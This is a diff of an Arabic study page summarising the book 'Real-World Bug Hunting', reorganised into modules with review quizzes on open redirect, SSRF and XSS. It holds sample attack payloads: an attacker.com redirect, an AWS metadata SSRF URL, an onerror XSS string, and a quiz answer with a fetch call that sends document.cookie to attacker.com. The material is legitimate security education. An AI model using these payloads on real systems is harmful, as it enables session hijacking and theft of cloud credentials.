@@ -22,7 +22,7 @@
       padding-bottom: 60px;
     }
     .book-container {
-      max-width: 1000px;
+      max-width: 1100px;
       margin: 40px auto;
       padding: 0 20px;
     }
@@ -104,10 +104,10 @@
     }
     .reading-grid {
       display: grid;
-      grid-template-columns: 260px 1fr;
+      grid-template-columns: 280px 1fr;
       gap: 30px;
     }
-    @media (max-width: 800px) {
+    @media (max-width: 900px) {
       .reading-grid {
         grid-template-columns: 1fr;
       }
@@ -152,7 +152,7 @@
       padding: 30px;
     }
     .content-sec {
-      margin-bottom: 40px;
+      margin-bottom: 50px;
       scroll-margin-top: 40px;
     }
     .sec-title {
@@ -179,6 +179,75 @@
       padding: 12px 18px;
       border-radius: 0 6px 6px 0;
       margin: 20px 0;
+    }
+    .benefit-box {
+      border-right: 3px solid var(--accent-cyan);
+      background: rgba(0, 229, 255, 0.03);
+      padding: 12px 18px;
+      border-radius: 0 6px 6px 0;
+      margin: 20px 0;
+    }
+    
+    /* Interactive Quiz Accordion Styles */
+    .quiz-container {
+      background: rgba(0, 229, 255, 0.02);
+      border: 1px solid rgba(0, 229, 255, 0.1);
+      border-radius: 8px;
+      padding: 20px;
+      margin: 25px 0;
+    }
+    .quiz-title {
+      font-family: 'Outfit', sans-serif;
+      color: var(--accent-cyan);
+      font-size: 1rem;
+      font-weight: 700;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .quiz-question-btn {
+      width: 100%;
+      background: none;
+      border: none;
+      padding: 12px 0;
+      font-family: inherit;
+      text-align: right;
+      color: #fff;
+      font-weight: 600;
+      font-size: 0.95rem;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      transition: color 0.2s ease;
+    }
+    .quiz-question-btn:hover {
+      color: var(--accent-cyan);
+    }
+    .toggle-icon {
+      color: var(--accent-cyan);
+      font-family: 'Fira Code', monospace;
+      font-weight: 700;
+      font-size: 0.85rem;
+      transition: all 0.2s ease;
+    }
+    .quiz-answer-panel {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.3s ease-out, padding 0.3s ease;
+      padding: 0 15px;
+      border-right: 3px solid var(--accent-cyan);
+      background: rgba(0, 229, 255, 0.01);
+      border-radius: 0 6px 6px 0;
+      font-size: 0.88rem;
+      color: var(--text-secondary);
+      margin-top: 0;
+    }
+    .quiz-answer-panel.open {
+      max-height: 200px;
+      padding: 12px 15px;
+      margin-top: 10px;
     }
   </style>
 </head>
@@ -215,30 +284,60 @@
       
       <!-- Sidebar Table of Contents -->
       <aside class="book-sidebar">
-        <div class="toc-title">فصول الكتاب</div>
-        <a href="#about" class="toc-item">1. نظرة عامة عن الكتاب</a>
-        <a href="#open-redirect" class="toc-item">2. ثغرة Open Redirect</a>
-        <a href="#ssrf" class="toc-item">3. ثغرة SSRF وكيفية عملها</a>
-        <a href="#xss" class="toc-item">4. ثغرات XSS وأنواعها</a>
-        <a href="#lessons" class="toc-item">5. أهم الدروس المستفادة</a>
+        <div class="toc-title">الوحدات التعليمية</div>
+        <a href="#module1" class="toc-item">1. نظرة عامة عن الكتاب</a>
+        <a href="#module2" class="toc-item">2. ثغرة Open Redirect</a>
+        <a href="#module3" class="toc-item">3. ثغرة طلب الخادم (SSRF)</a>
+        <a href="#module4" class="toc-item">4. ثغرات حقن النص (XSS)</a>
+        <a href="#module5" class="toc-item">5. أهم الدروس المستفادة</a>
       </aside>
 
       <!-- Main Content Area -->
       <main class="book-content">
         
-        <!-- Section 1: About -->
-        <section id="about" class="content-sec">
-          <h2 class="sec-title">1. نظرة عامة عن الكتاب</h2>
-          <p>كتاب <strong>Real-World Bug Hunting</strong> هو أحد أفضل الكتب الموصى بها لأي شخص يرغب في الدخول إلى مجال صيد ثغرات البرامج (Bug Bounty). يركز الكاتب بيتر ياورسكي على شرح كيفية عمل الثغرات الأمنية في العالم الحقيقي بناءً على تقارير حقيقية تم تقديمها لشركات كبرى على منصات مثل HackerOne.</p>
+        <!-- Module 1: About -->
+        <section id="module1" class="content-sec">
+          <h2 class="sec-title">الوحدة الأولى: نظرة عامة عن الكتاب والعقلية البرمجية</h2>
+          
+          <div class="benefit-box">
+            <strong>لماذا تتعلم هذا؟ (The Benefit)</strong>
+            <p>مجال الـ Bug Bounty ليس مجرد تشغيل عشوائي للأدوات التلقائية. هذا الكتاب يؤسس لديك عقلية "فهم المطور" لمعرفة كيف تقع الأخطاء الأمنية الحقيقية في الشركات الكبرى عبر الاطلاع على تقارير حقيقية ومصنفة.</p>
+          </div>
+
+          <p><strong>شرح المحتوى (The Guide)</strong></p>
+          <p>كتاب <strong>Real-World Bug Hunting</strong> للكاتب بيتر ياورسكي يركز على تفكيك ثغرات تطبيقات الويب استناداً إلى بلاغات واقعية تم تسليمها لشركات عالمية على منصة <code>HackerOne</code>.</p>
+          
           <div class="key-point">
             <strong>نصيحة الكاتب الذهبية:</strong> لا تحفظ الأدوات أو تشغلها بشكل أعمى، بل افهم كيف يعمل التطبيق في الخلفية لتتمكن من إيجاد الثغرات التي تغفل عنها أدوات الفحص التلقائي.
           </div>
+
+          <!-- Quiz 1 -->
+          <div class="quiz-container">
+            <div class="quiz-title">🧪 أسئلة المراجعة وتأكيد الفهم (انقر لعرض الإجابة النموذجية)</div>
+            
+            <div class="quiz-item">
+              <button class="quiz-question-btn" onclick="toggleAnswer('q1-1')">
+                <span>1. ما هي الفكرة الأساسية التي بني عليها كتاب Real-World Bug Hunting؟</span>
+                <span class="toggle-icon" id="icon-q1-1">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-q1-1">
+                <strong>الإجابة النموذجية:</strong> شرح آلية عمل الثغرات وتأثيرها الفعلي اعتماداً على تقارير ثغرات حقيقية ومنشورة (Disclosed Reports) تم تقديمها لشركات كبرى على منصة HackerOne لمساعدة الباحثين على فهم واقعية الاستغلال وتوثيق ثغراتهم.
+              </div>
+            </div>
+          </div>
         </section>
 
-        <!-- Section 2: Open Redirect -->
-        <section id="open-redirect" class="content-sec">
-          <h2 class="sec-title">2. ثغرة التوجيه المفتوح (Open Redirect)</h2>
-          <p>تشرح فصول الكتاب الأولى كيف يستغل المهاجم المعاملات (Parameters) التي تتحكم في إعادة التوجيه بعد تسجيل الدخول أو إتمام عملية معينة لتوجيه المستخدمين لمواقع التصيد الاحتيالي.</p>
+        <!-- Module 2: Open Redirect -->
+        <section id="module2" class="content-sec">
+          <h2 class="sec-title">الوحدة الثانية: ثغرة التوجيه المفتوح (Open Redirect)</h2>
+          
+          <div class="benefit-box">
+            <strong>لماذا تتعلم هذا؟ (The Benefit)</strong>
+            <p>تساعد ثغرات التوجيه المفتوح المهاجمين في إرسال روابط موثوقة للضحايا تنتهي بتوجيههم لصفحات تصيد خارقة للخصوصية، ومعرفتها تمنحك فهماً أعمق لكيفية تسريب الـ Tokens الحساسة.</p>
+          </div>
+
+          <p><strong>شرح المحتوى (The Guide)</strong></p>
+          <p>تحدث الثغرة عندما يقبل معامل التحكم بالصفحة التالية (مثل <code>next</code> أو <code>redirect_url</code>) روابط خارجية غير موثوقة دون فحصها بمطابقة نطاق التطبيق نفسه.</p>
           <div class="code-box">
             // مثال على رابط مصاب بالثغرة
             https://target.com/login?next=http://attacker.com
@@ -246,39 +345,142 @@
           <p><strong>طرق فحص الثغرة وتخطي الفلاتر:</strong></p>
           <ul>
             <li>استبدال النطاق الكامل برمز الخط المائل المزدوج: <code>//attacker.com</code></li>
-            <li>التخطي باستخدام رموز url encode أو الكود البرمجي المباشر.</li>
+            <li>التخطي باستخدام رموز url encode أو استخدام النطاقات الفرعية الموجهة.</li>
           </ul>
+
+          <!-- Quiz 2 -->
+          <div class="quiz-container">
+            <div class="quiz-title">🧪 أسئلة المراجعة وتأكيد الفهم (انقر لعرض الإجابة النموذجية)</div>
+            
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswer('q2-1')">
+                <span>1. لماذا تعتبر ثغرات Open Redirect منخفضة الخطورة بمفردها ولكنها خطيرة بالاشتراك؟</span>
+                <span class="toggle-icon" id="icon-q2-1">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-q2-1">
+                <strong>الإجابة النموذجية:</strong> بمفردها تُستخدم في التصيد (Phishing)، ولكن عند دمجها (Chaining) مع ثغرات مثل SSRF أو تسريبات OAuth، قد تمكن المهاجم من تسريب رموز تسجيل الدخول الحساسة أو التوجيه لملفات RCE.
+              </div>
+            </div>
+
+            <div class="quiz-item">
+              <button class="quiz-question-btn" onclick="toggleAnswer('q2-2')">
+                <span>2. كيف يمكن للمطورين حماية التطبيق من ثغرات التوجيه المفتوح؟</span>
+                <span class="toggle-icon" id="icon-q2-2">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-q2-2">
+                <strong>الإجابة النموذجية:</strong> استخدام قائمة بيضاء (Whitelist) بالنطاقات المسموح بها فقط، أو الاعتماد على مسارات محلية نسبية (Relative Paths) بدلاً من قبول نطاقات خارجية كاملة.
+              </div>
+            </div>
+          </div>
         </section>
 
-        <!-- Section 3: SSRF -->
-        <section id="ssrf" class="content-sec">
-          <h2 class="sec-title">3. ثغرة طلب الخادم المزيف (SSRF)</h2>
-          <p>تعتبر ثغرة Server-Side Request Forgery من الثغرات ذات الأهمية العالية (High/Critical) لأنها تسمح للمهاجم بإجبار خادم الويب على إرسال طلبات داخلية أو خارجية نيابة عنه، وبالتالي فحص الشبكة الداخلية للخادم وقراءة البيانات الحساسة.</p>
+        <!-- Module 3: SSRF -->
+        <section id="module3" class="content-sec">
+          <h2 class="sec-title">الوحدة الثالثة: ثغرة طلب الخادم المزيف (SSRF)</h2>
+          
+          <div class="benefit-box">
+            <strong>لماذا تتعلم هذا؟ (The Benefit)</strong>
+            <p>تعتبر ثغرة SSRF من الثغرات الحرجة لأنها تجبر خادم الويب على القيام بدور المهاجم نفسه، مما يسمح بفحص البنية التحتية المحمية خلف الجدار الناري وقراءة بيانات الخوادم الحساسة.</p>
+          </div>
+
+          <p><strong>شرح المحتوى (The Guide)</strong></p>
+          <p>تحدث Server-Side Request Forgery عندما يقبل التطبيق رابطاً (URL) يمرره المستخدم ويقوم الخادم الخلفي بإصدار طلب HTTP لهذا الرابط دون التحقق من وجهته.</p>
           <div class="code-box">
             // استدعاء معلومات خوادم AWS الداخلية
             https://target.com/preview?url=http://169.254.169.254/latest/meta-data/
           </div>
-          <p>يوضح الكتاب كيف تمكن بعض الباحثين من قراءة بيانات السحابة وحجز مكافآت تجاوزت الـ $10,000 عبر استغلال هذه الثغرة للوصول للخدمات السحابية للشركات.</p>
-        </section>
+          <p>يوضح الكتاب كيف يستغل الباحثون هذه الثغرة لقراءة بيانات الحوسبة السحابية (Cloud Metadata API) واستخراج مفاتيح التحكم السرية.</p>
 
-        <!-- Section 4: XSS -->
-        <section id="xss" class="content-sec">
-          <h2 class="sec-title">4. ثغرات حقن النص البرمجي (XSS)</h2>
-          <p>يغطي الكتاب ثغرات Cross-Site Scripting بأنواعها الثلاثة الرئيسية: Reflected و Stored و DOM-Based. يشرح الكاتب كيف يمكن للمهاجم سرقة ملفات الارتباط (Session Cookies) أو تعديل الصفحة لتنفيذ عمليات ضارة باسم المستخدم.</p>
-          <p><strong>تخطي الفلاتر البسيطة:</strong></p>
-          <div class="code-box">
-            &lt;img src=x onerror=alert(1)&gt;
+          <!-- Quiz 3 -->
+          <div class="quiz-container">
+            <div class="quiz-title">🧪 أسئلة المراجعة وتأكيد الفهم (انقر لعرض الإجابة النموذجية)</div>
+            
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswer('q3-1')">
+                <span>1. ما هي الخطورة الحقيقية لثغرة SSRF عندما يقع خادم الموقع في بيئة سحابية (مثل AWS)؟</span>
+                <span class="toggle-icon" id="icon-q3-1">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-q3-1">
+                <strong>الإجابة النموذجية:</strong> تمكن المهاجم من الاتصال بخدمة بيانات التعريف الخاصة بالـ Cloud Instance (عنوان IP: 169.254.169.254) وسحب رموز الدخول الحساسة وبيانات التهيئة والوصول للسيرفر السحابي بالكامل.
+              </div>
+            </div>
+
+            <div class="quiz-item">
+              <button class="quiz-question-btn" onclick="toggleAnswer('q3-2')">
+                <span>2. كيف تحمي الشركات خوادمها من ثغرات طلب الخادم المزيف؟</span>
+                <span class="toggle-icon" id="icon-q3-2">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-q3-2">
+                <strong>الإجابة النموذجية:</strong> من خلال التحقق من صحة الروابط المدخلة وتفعيل القوائم البيضاء، وحظر كافة الطلبات الموجهة لعناوين الشبكة الداخلية (Private IPs) مثل 127.0.0.1 و 192.168.x.x و 10.x.x.x.
+              </div>
+            </div>
           </div>
         </section>
 
-        <!-- Section 5: Lessons -->
-        <section id="lessons" class="content-sec">
-          <h2 class="sec-title">5. أهم الدروس المستفادة</h2>
+        <!-- Module 4: XSS -->
+        <section id="module4" class="content-sec">
+          <h2 class="sec-title">الوحدة الرابعة: ثغرات حقن النص البرمجي (XSS) في العالم الحقيقي</h2>
+          
+          <div class="benefit-box">
+            <strong>لماذا تتعلم هذا؟ (The Benefit)</strong>
+            <p>تجاوز فلاتر الـ XSS في المواقع الكبرى يتطلب ذكاءً في فهم آلية فحص المدخلات، وتوظيف الثغرة في سيناريو سرقة الجلسات يثبت خطورتها القصوى لفريق التقييم.</p>
+          </div>
+
+          <p><strong>شرح المحتوى (The Guide)</strong></p>
+          <p>يركز بيتر ياورسكي على تخطي جدران الحماية وفلاتر جافا سكريبت البسيطة. المطورون قد يحظرون وسم <code>&lt;script&gt;</code> ولكن يغفلون عن الأحداث المرفقة بالوسوم الأخرى:</p>
+          <div class="code-box">
+            // استغلال أحداث الخطأ لتخطي الحظر
+            &lt;img src=x onerror=alert(1)&gt;
+          </div>
+          <p>ومن خلال ثغرات XSS، يستطيع المهاجم الوصول لملفات الكوكيز وسرقة جلسة المستخدم النشطة.</p>
+
+          <!-- Quiz 4 -->
+          <div class="quiz-container">
+            <div class="quiz-title">🧪 أسئلة المراجعة وتأكيد الفهم (انقر لعرض الإجابة النموذجية)</div>
+            
+            <div class="quiz-item">
+              <button class="quiz-question-btn" onclick="toggleAnswer('q4-1')">
+                <span>1. كيف يتم استغلال ثغرة XSS لتنفيذ هجوم سرقة ملفات الارتباط (Cookie Stealing)؟</span>
+                <span class="toggle-icon" id="icon-q4-1">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-q4-1">
+                <strong>الإجابة النموذجية:</strong> كتابة كود جافا سكريبت يقرأ قيمة <code>document.cookie</code> ويرسلها فوراً عبر طلب HTTP إلى خادم خارجي يمتلكه المهاجم (مثل: <code>fetch('http://attacker.com/log?cookie=' + document.cookie)</code>).
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Module 5: Lessons -->
+        <section id="module5" class="content-sec">
+          <h2 class="sec-title">الوحدة الخامسة: أهم الدروس المستفادة وصياغة البلاغات</h2>
+          
+          <div class="benefit-box">
+            <strong>لماذا تتعلم هذا؟ (The Benefit)</strong>
+            <p>أفضل الباحثين الأمنيين ليسوا فقط من يجدون الثغرات، بل من يستطيعون تقديمها بشكل مفهوم وحجز تقدير مالي يستحق تعبهم وجهدهم البرمجي.</p>
+          </div>
+
+          <p><strong>شرح المحتوى (The Guide)</strong></p>
+          <p>يلخص الكتاب القواعد الذهبية لصيد الثغرات:</p>
           <ul>
-            <li>المنهجية الفعالة وتوثيق الخطوات هما سر النجاح كصياد ثغرات محترف.</li>
-            <li>كتابة التقارير بطريقة احترافية تسهل على فريق الحماية فهم المشكلة وحجم التأثير، مما يضمن تقييم ثغرتك بمكافأة عادلة.</li>
-            <li>التعلم المستمر ومتابعة التقارير العامة (Disclosed Reports) تفتح لك آفاقاً جديدة لأفكار استغلال مبتكرة.</li>
+            <li><strong>التوثيق:</strong> تصوير خطوات الاستغلال بوضوح وهدوء.</li>
+            <li><strong>المنهجية الفعالة:</strong> قراءة التقارير العامة المكتشفة سابقاً لمعرفة طريقة تفكير الآخرين.</li>
+            <li><strong>تجنب التشتت:</strong> التركيز على فحص تطبيق واحد بدلاً من التنقل العشوائي بين مئات الأهداف يومياً.</li>
           </ul>
+
+          <!-- Quiz 5 -->
+          <div class="quiz-container">
+            <div class="quiz-title">🧪 أسئلة المراجعة وتأكيد الفهم (انقر لعرض الإجابة النموذجية)</div>
+            
+            <div class="quiz-item">
+              <button class="quiz-question-btn" onclick="toggleAnswer('q5-1')">
+                <span>1. ما هو المبدأ الأساسي الذي يركز عليه الكاتب لتحسين جودة وتوثيق التقارير؟</span>
+                <span class="toggle-icon" id="icon-q5-1">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-q5-1">
+                <strong>الإجابة النموذجية:</strong> تبسيط الشرح وفهم دوافع فريق الحماية أمنياً، والتركيز على تقديم استغلال نظيف ومفهوم (PoC) يوضح تأثير الثغرة الفعلي على أعمال الشركة وتجنب التعقيد غير المبرر.
+              </div>
+            </div>
+          </div>
         </section>
 
       </main>
@@ -286,6 +488,24 @@
     </div>
 
   </div>
+
+  <!-- Interactive Quiz Accordion Logic -->
+  <script>
+    function toggleAnswer(ansId) {
+      const panel = document.getElementById('ans-' + ansId);
+      const icon = document.getElementById('icon-' + ansId);
+      
+      if (panel.classList.contains('open')) {
+        panel.classList.remove('open');
+        icon.innerText = '[ + ]';
+        icon.style.color = 'var(--accent-cyan)';
+      } else {
+        panel.classList.add('open');
+        icon.innerText = '[ - ]';
+        icon.style.color = 'var(--accent-orange)';
+      }
+    }
+  </script>
 
 </body>
 </html>
